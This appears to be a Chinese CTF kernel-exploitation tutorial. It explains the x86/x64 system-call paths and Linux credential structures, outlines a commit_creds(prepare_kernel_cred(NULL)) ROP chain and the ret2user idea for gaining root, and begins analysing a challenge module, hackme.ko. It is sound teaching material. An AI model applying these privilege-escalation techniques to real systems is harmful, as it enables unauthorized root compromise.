<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = __NR_write 	(write的系统调用号)</span><br><span class="line">rbx = fd 			(第一个参数)</span><br><span class="line">rcx = buf 			(第二个参数)</span><br><span class="line">rdx = count 		(第三个参数)</span><br></pre></td></tr></table></figure>
<p>然后执行<code>int 0x80</code>指令,</p>
<blockquote>
<p>所有的<code>int n</code>指令,都对应到<code>IDT(Interrupt Describetor Table)</code><strong>中断描述符表</strong>中的一个门</p>
<p><code>IDT</code>表共有<code>256</code>个表项,也就是说<code>int n</code>这里的<code>n</code>能够允许的范围是<code>0~255</code></p>
<p>其中0~31项保留给CPU定义的异常和中断, 也就是内部中断或异常</p>
<p>​ 比如int 0 表示除法出错, 也就是DIV出错</p>
<p>​ 比如int 3 表示断点命中</p>
<p>32~255保留给用户或者设备, 也就是外部中断或者异常</p>
<p>​ 比如int 0x80 表示系统调用</p>
<p>IDT表中有三类表项, 中断门,陷阱门,任务门</p>
</blockquote>
<p><code>int 0x80</code>这条指令在<code>sched_init @ kernel/shed.c</code>中被注册为陷阱门</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sched_init @ kernel/shed.c</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n, addr) 	_set_gate(&amp;idt[n], 15, 3, addr)</span></span><br></pre></td></tr></table></figure>
<p>在该陷阱门中<code>system_call</code>函数被注册为中断处理过程</p>
<blockquote>
<p><code>system_call</code>在<code>kernel/sys_call.s</code>中被定义为一个函数,
是所有系统调用的入口,
以eax寄存器值作为系统调用号索引对应系统调用函数</p>
</blockquote>
<p><code>int 0x80</code>过程:</p>
<p>1.由<code>IDTR</code>寄存器查到<code>IDT</code>表基地址</p>
<p>2.以<code>0x80</code>作为索引查<code>IDT</code>表得到<code>IDT[0x80]</code>门,
是一个陷阱门</p>
<p>3.<code>IDT[0x80]</code>中获得(中断处理过程所在段的)段选择子,
陷阱门<code>DPL</code>, (中断处理过程在其)段中的偏移量</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120152851772.png"
alt="image-20241120152851772" />
<figcaption aria-hidden="true">image-20241120152851772</figcaption>
</figure>
<p>4.由段选择子查<code>LDT</code>或者<code>GDT</code>表获得中断处理过程<code>system_call</code>所在段</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120153036405.png"
alt="image-20241120153036405" />
<figcaption aria-hidden="true">image-20241120153036405</figcaption>
</figure>
<p>然后段基地址加上<code>IDT</code>中保留的偏移量找到<code>system_call</code>函数地址</p>
<p>5.在调用<code>system_call</code>函数之前,
需要考虑前后段属性是否有改变</p>
<p>对于系统调用来说,
是从3环上经过陷阱门调用<code>0</code>环上的<code>system_call</code>,
段权限发生了变化</p>
<p>因此首先切换堆栈, 从用户堆栈切换到内核堆栈, 切换过程:</p>
<p>​ (1)
从当前用户任务的TSS段中得到<code>0</code>环堆栈的段地址<code>ss0</code>和栈顶指针<code>esp0</code></p>
<p>​ (2) <code>ss3:esp3</code>更换为<code>ss0:esp0</code></p>
<p>​ (3) <code>ss3:esp3</code>压到新栈中保存,
<code>eflags, cs:eip</code>也依次压入新栈</p>
<p>​ (4) 异常产生的错误号压栈(如果有的话)</p>
<p>对于同级的中断,比如内核中执行时遭遇除零异常等,不会发生堆栈切换</p>
<p>​ (1)<code>eflags, cs:eip</code> 压栈</p>
<p>​ (2)异常产生的错误号压栈(如果有的话)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120155553711.png"
alt="image-20241120155553711" />
<figcaption aria-hidden="true">image-20241120155553711</figcaption>
</figure>
<p>6.此后就运行在内核态的<code>system_call</code>函数中了</p>
<p>7.当<code>system_call</code>要返回时,最后会有一条<code>iret</code>指令,而不是普通的<code>ret</code>指令</p>
<p>此时内核栈或者说<code>0</code>环栈上的状态,
和刚进入<code>system_call</code>时相同,</p>
<p><code>iret</code> 指令会根据栈顶上的内容还原到之前的用户程序中</p>
<blockquote>
<p><code>ret2user</code>的原理就是在内核堆栈中伪造一个假的用户上下文,让<code>iret</code>返回到攻击者期望的用户程序中</p>
</blockquote>
<h3 id="x64">x64</h3>
<p>x64上的系统调用不再使用中断向量表,
也就是说不会再使用<code>int</code>系指令</p>
<p>x64上引入了新的中断机制, 叫做APIC,
并且给系统调用实现了专门的<code>syscall</code>指令,</p>
<p>必须将系统调用入口函数<code>entry_SYSCALL_64</code>的地址,
注册到<code>MSR</code>寄存器中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@linux5.13/arch/x86/kernel/cpu/common.c/syscall_init.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	wrmsr(MSR_STAR, <span class="number">0</span>, (__USER32_CS &lt;&lt; <span class="number">16</span>) | __KERNEL_CS);</span><br><span class="line">	wrmsrl(MSR_LSTAR, (<span class="type">unsigned</span> <span class="type">long</span>)entry_SYSCALL_64);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>此后syscall指令会查MSR寄存器,跳到<code>entry_SYSCALL_64</code>中执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	<span class="comment">/* tss.sp2 is scratch space. */</span></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS				<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">	pushq	%r11					<span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">	pushq	$__USER_CS				<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx					<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to use SYSRET instead of IRET if we&#x27;re returning to</span></span><br><span class="line"><span class="comment">	 * a completely clean 64-bit userspace context.  If we&#x27;re not,</span></span><br><span class="line"><span class="comment">	 * go to the slow exit path.</span></span><br><span class="line"><span class="comment">	 * In the Xen PV case we must use iret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;&quot;</span>, <span class="string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \</span><br><span class="line">		X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	<span class="comment">/* SYSRET requires RCX == RIP */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP</span></span><br><span class="line"><span class="comment">	 * in kernel space.  This essentially lets the user take over</span></span><br><span class="line"><span class="comment">	 * the kernel, since userspace controls RSP.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span></span><br><span class="line"><span class="comment">	 * to be updated to remain correct on both old and new CPUs.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Change top bits to match most significant bit (47th or 56th bit</span></span><br><span class="line"><span class="comment">	 * depending on paging mode) in the address.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_5LEVEL</span></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">		<span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	shl	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">	sar	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If this changed %rcx, it was not canonical */</span></span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		<span class="comment">/* CS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		<span class="comment">/* R11 == RFLAGS */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span></span><br><span class="line"><span class="comment">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span></span><br><span class="line"><span class="comment">	 * need to restore it correctly.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span></span><br><span class="line"><span class="comment">	 * trap from userspace immediately after SYSRET.  This would cause an</span></span><br><span class="line"><span class="comment">	 * infinite loop whenever #DB happens with register state that satisfies</span></span><br><span class="line"><span class="comment">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span></span><br><span class="line"><span class="comment">	 * this user code:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *           movq	$stuck_here, %rcx</span></span><br><span class="line"><span class="comment">	 *           pushfq</span></span><br><span class="line"><span class="comment">	 *           popq %r11</span></span><br><span class="line"><span class="comment">	 *   stuck_here:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * would never get past &#x27;stuck_here&#x27;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* nothing to check for RSP */</span></span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		<span class="comment">/* SS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We win! This label is here just for ease of understanding</span></span><br><span class="line"><span class="comment">	 * perf profiles. Nothing jumps here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	<span class="comment">/* rcx and r11 are already restored (see code above) */</span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now all regs are restored except RSP and RDI.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	(%rdi)		<span class="comment">/* RDI */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	swapgs</span><br><span class="line">	sysretq</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>
<p>执行完毕后使用sysretq返回到用户态</p>
<p>在x64上有两种返回到用户态的命令</p>
<p><code>sysret</code>和<code>iret</code></p>
<p>注意到<code>x64</code>上<code>syscall</code>一开始和最后<code>sysret</code>之前,
都有一个<code>swapgs</code>, 这个指令也是<code>x64</code>独有的</p>
<p><code>fs,gs</code>这两个段寄存器是<code>x86</code>上引入的两个附加段寄存器</p>
<p><code>fs</code>用于在用户态的<code>glibc</code>中保存<code>TLS</code></p>
<p><code>gs</code>用于在内核态保存<code>percpu</code>变量与<code>canary</code></p>
<p><code>fs</code>在内核态无用,<code>gs</code>在用户态无效</p>
<p><code>swapgs</code>中更换的<code>gs</code>来自于MSR寄存器</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120204022830.png"
alt="image-20241120204022830" />
<figcaption aria-hidden="true">image-20241120204022830</figcaption>
</figure>
<p>总是当前使用一个,然后MSR记住另一个</p>
<h2 id="privilege-escalation">privilege escalation</h2>
<p>进程权限由<code>task_struct</code>的成员<code>struct cred *cred</code>控制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line">    <span class="type">void</span> *security;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要提升一个普通进程的权限到<code>root</code>,
可以找一个<code>root</code>进程的<code>cred</code>抄过来</p>
<p>修改进程<code>cred</code>的方法:</p>
<p>1.要么构造<code>rop</code>链调用内核函数<code>commit_creds(&amp;init_cred);</code>,抄<code>init</code>进程的<code>cred</code>替换当前进程的</p>
<p>2.要么有一个内核内存任意写的利用原语,
找到当前进程<code>task_struct</code>, 然后找到<code>cred</code> ,
然后修改之</p>
<h3 id="commit_credsinit_cred">commit_creds(&amp;init_cred);</h3>
<p>这就有一个问题,怎么才能找到<code>init</code>进程的<code>cred</code>?</p>
<p>怎么才能找到<code>struct init_task</code>?</p>
<p><code>Linux 6.2</code>之前有另一个函数<code>prepare_kernel_cred</code>给我们代劳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//daemon == NULL时返回init_cred</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>
<p>当参数为<code>NULL</code>时,
该函数返回<code>init_cred</code>,也就是<code>init_task</code>的<code>cred</code></p>
<p>因此可以构造堆栈<code>rop</code>链:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/elevation-of-privilege.png"
alt="commit_creds(prepare_kernel_cred(NULL))" />
<figcaption
aria-hidden="true">commit_creds(prepare_kernel_cred(NULL))</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span> =&gt; rdi</span><br><span class="line">prepare_kernel_cred(rdi) =&gt; rax</span><br><span class="line">rax =&gt; rdi</span><br><span class="line">commit_creds(rdi)</span><br></pre></td></tr></table></figure>
<p>但是<code>Linux 6.2</code>及之后如果参数为<code>NULL</code>则直接返回<code>NULL</code>了,
叫没法空手套白狼了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<h2 id="vulnerability-kernel-module">vulnerability kernel module</h2>
<p>题目所给的内核模块<code>hackme.ko</code></p>
<p>模块的初始化函数中调用<code>misc_register</code>函数注册了一个<code>struct miscdevice</code>字符杂项设备</p>
<blockquote>
<p>字符杂项设备</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>&#123;</span></span><br><span class="line">　　<span class="type">int</span> minor; <span class="comment">//杂项设备的此设备号(如果设置为MISC_DYNAMIC_MINOR，表示系统自动分配未使用的minor)</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *name;		<span class="comment">// /dev目录下的节点名称</span></span><br><span class="line">　　<span class="type">const</span> stuct file_operations *fops;<span class="comment">//驱动主题函数入口指针</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *nodename;<span class="comment">//</span></span><br><span class="line">　　<span class="type">mode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>字符杂项设备的主设备号自动被设置为<code>10</code>,
次设备号由<code>minor</code>字段定义</p>
<p><code>misc_register</code>注册字符杂项设备时会自动在<code>/dev/</code>下创建设备节点文件,
节点文件名由<code>name</code>字段给出,
<code>nodename</code>表示<code>/dev/下</code>的二级目录,
如果<code>nodename</code>非空则创建节点文件<code>/dev/&lt;nodename&gt;/name</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000440</span> hackme_misc     dd <span class="number">0F</span>Fh                 ; minor</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; DATA XREF: hackme_init+<span class="number">6</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; hackme_exit+<span class="number">1</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">4</span> dup(<span class="number">0</span>)             ; <span class="string">&quot;hackme&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset aHackme       ; name</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset hackme_fops   ; fops</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.next</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.prev</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; parent</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; this_device</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; groups</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; nodename</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dw <span class="number">0</span>                    ; mode</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">6</span> dup(<span class="number">0</span>)</span><br><span class="line">.data:<span class="number">0000000000000440</span> _data           ends</span><br></pre></td></tr></table></figure>
